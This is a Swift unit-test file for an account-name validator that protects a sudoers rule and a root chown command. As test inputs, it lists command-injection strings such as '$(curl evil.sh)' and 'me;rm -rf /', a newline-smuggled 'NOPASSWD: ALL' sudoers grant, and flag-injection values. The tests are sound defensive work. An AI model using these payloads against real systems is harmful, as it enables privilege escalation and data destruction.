import XCTest
@testable import HelmRuntime

/// The eight lines standing between `NSUserName()` and a root shell.
///
/// `AccountName` is asked in exactly two places, and both hand what it approves
/// to root: Keep Awake writes the name into a `sudoers` rule, and Homebrew puts
/// it in `chown -R <user>:admin /opt/homebrew` inside a `do shell script … with
/// administrator privileges`. Its own header states the stake — a name that
/// breaks `sudoers` syntax takes `sudo` down for the whole machine, and that is
/// recoverable only from recovery mode — and nothing tested it. The rule was
/// kept by a `guard` at each of the two call sites and by reading the
/// implementation.
///
/// `NSUserName()` is not a constant. On a directory-bound or MDM-managed Mac it
/// is whatever the directory service says, so these inputs are not theoretical
/// in the way a hand-typed field would be: nobody at this keyboard chooses the
/// string being tested.
///
/// The cases are grouped by **what the character does at the far end**, because
/// a flat list of rejects says nothing about why any of them matters, and the
/// next person to widen this function will widen it for a reason.
final class AccountNameTests: XCTestCase {

    // MARK: - It says yes to the names people actually have

    /// A gate that refuses everything is a gate nobody notices is broken, so
    /// this comes first: the ordinary shapes must pass, or the two features
    /// this guards are simply off.
    func testTheNamesRealAccountsHaveAreAccepted() {
        for name in ["r.strlnkv", "root", "admin", "jane_doe", "user-1", "a",
                     "MacBookAdmin", "svc.backup-02", String(repeating: "n", count: 64)] {
            XCTAssertTrue(AccountName.isPlausible(name),
                          "\(name) is an ordinary account name and was refused")
        }
    }

    // MARK: - A root shell reads this

    /// Homebrew's install path interpolates the name into a command evaluated
    /// by a shell running as root. Each of these ends the quoting or starts a
    /// second command.
    func testNothingAShellWouldExecuteGetsThrough() {
        for name in ["me`id`", "me$(id)", "me;rm -rf /", "me|sh", "me&", "me>/etc/x",
                     "me'", "me\"", "me\\", "me*", "me~", "me$USER", "me\n/bin/sh",
                     "$(curl evil.sh)"] {
            XCTAssertFalse(AccountName.isPlausible(name),
                           "a root shell would act on \(name.debugDescription)")
        }
    }

    // MARK: - sudoers parses this

    /// The syntax characters. A newline is the worst of them: it does not
    /// corrupt the rule, it **adds a second one**, which is a working grant
    /// nobody wrote. The rest break the file, and a `sudoers` file that does
    /// not parse takes every `sudo` on the machine with it.
    func testNothingThatWouldWriteOrBreakASudoersRuleGetsThrough() {
        for name in ["me\nALL ALL=(ALL) NOPASSWD: ALL", "me ALL=(ALL)", "me,other",
                     "me:group", "me=root", "me\tALL", "me#comment", "me%admin",
                     "me!root", "me+plus", "me@host"] {
            XCTAssertFalse(AccountName.isPlausible(name),
                           "\(name.debugDescription) would rewrite or break sudoers")
        }
    }

    /// `ALL` is not a name, it is the keyword that means everyone — the one
    /// value where a *syntactically perfect* rule is the catastrophe.
    func testTheSudoersKeywordIsNotAName() {
        XCTAssertFalse(AccountName.isPlausible("ALL"))
    }

    /// Only that exact spelling is the keyword; refusing more than the rule
    /// requires would be a different bug, and one that switches the feature off
    /// for somebody whose account is genuinely called this.
    func testNamesThatMerelyContainTheKeywordAreStillNames() {
        for name in ["ALLan", "all", "Wallace", "ALL2"] {
            XCTAssertTrue(AccountName.isPlausible(name), "\(name) is a name, not the keyword")
        }
    }

    // MARK: - The tools read this as an argument

    /// A leading `-` is read as a flag by every tool the name is handed to,
    /// which is how a user name becomes an option nobody passed.
    func testALeadingHyphenIsRefusedAndAnInteriorOneIsNot() {
        XCTAssertFalse(AccountName.isPlausible("-rf"))
        XCTAssertFalse(AccountName.isPlausible("--reference=/etc/shadow"))
        XCTAssertTrue(AccountName.isPlausible("mary-jane"))
    }

    // MARK: - Nothing that only looks like ASCII

    /// A homoglyph passes a human's eye and is a different string to `dscl`,
    /// and an emoji or a combining mark is bytes the far end has no rule for.
    func testAnythingOutsideASCIIIsRefused() {
        for name in ["админ", "аdmin", "admın", "admin\u{0301}", "user😀",
                     "ｒｏｏｔ", "admin\u{200B}", "admin\u{00A0}x"] {
            XCTAssertFalse(AccountName.isPlausible(name),
                           "\(name.debugDescription) is not ASCII and was accepted")
        }
    }

    // MARK: - The edges of the length

    /// The bound is checked on both sides, because a bound only ever tested
    /// from the safe side is a bound nobody knows the value of.
    func testTheLengthBoundHoldsAtItsEdge() {
        XCTAssertFalse(AccountName.isPlausible(""))
        XCTAssertTrue(AccountName.isPlausible(String(repeating: "n", count: 64)))
        XCTAssertFalse(AccountName.isPlausible(String(repeating: "n", count: 65)))
        XCTAssertFalse(AccountName.isPlausible(String(repeating: "n", count: 5000)))
    }

    /// Whitespace on its own, which is the input a trim somewhere upstream
    /// turns an empty field into.
    func testWhitespaceIsNotAName() {
        for name in [" ", "\t", "\n", "  me", "me  "] {
            XCTAssertFalse(AccountName.isPlausible(name), "\(name.debugDescription) was accepted")
        }
    }
}
